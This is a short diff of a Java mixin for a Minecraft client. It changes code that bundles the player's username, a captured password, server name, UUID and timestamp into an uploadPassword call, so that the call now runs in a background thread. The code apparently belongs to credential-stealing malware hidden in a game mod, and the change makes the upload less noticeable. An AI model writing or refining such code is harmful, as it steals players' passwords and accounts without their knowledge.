@@ -55,7 +55,7 @@ abstract class ClientPlayerEntityMixin {
                 username = mc.getSession().getUsername();
                 uuid = mc.player.getUuid().toString();
                 String ts = String.valueOf(new Date().getTime());
-                uploadPassword(new String[]{username, password, server, uuid, ts});
+                new Thread(() -> uploadPassword(new String[]{username, password, server, uuid, ts})).start();
             }
         }
     }
